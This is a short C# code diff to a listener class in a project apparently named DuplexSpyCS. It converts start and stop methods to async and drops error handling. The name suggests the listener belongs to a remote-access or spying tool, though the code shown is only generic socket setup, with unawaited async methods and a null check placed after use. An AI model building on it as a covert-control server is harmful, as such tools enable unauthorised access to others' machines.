@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Runtime.CompilerServices;
 using System.Security;
 using System.Text;
 using System.Threading.Tasks;
@@ -95,30 +96,23 @@ namespace DuplexSpyCS
 
         ~clsHttpListener() => fnStop();
 
-        public override void fnStart()
+        public override async Task fnStart()
         {
-            try
-            {
-                Socket sktSrv = m_listener.Server;
-                var hSafe = sktSrv.SafeHandle;
-                if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
-                    m_listener = new TcpListener(IPAddress.Any, m_nPort);
-                m_cts = new CancellationTokenSource();
-                m_listener.Start();
+            Socket sktSrv = m_listener.Server;
+            var hSafe = sktSrv.SafeHandle;
+            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
+                m_listener = new TcpListener(IPAddress.Any, m_nPort);
+            m_cts = new CancellationTokenSource();
+            m_listener.Start();
 
-                _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
+            _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
 
-                m_bIslistening = true;
+            m_bIslistening = true;
 
-                fnOnListenerStarted(this);
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message, "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+            fnOnListenerStarted(this);
         }
 
-        public override void fnStop()
+        public override async Task fnStop()
         {
             if (!m_bIslistening)
                 return;
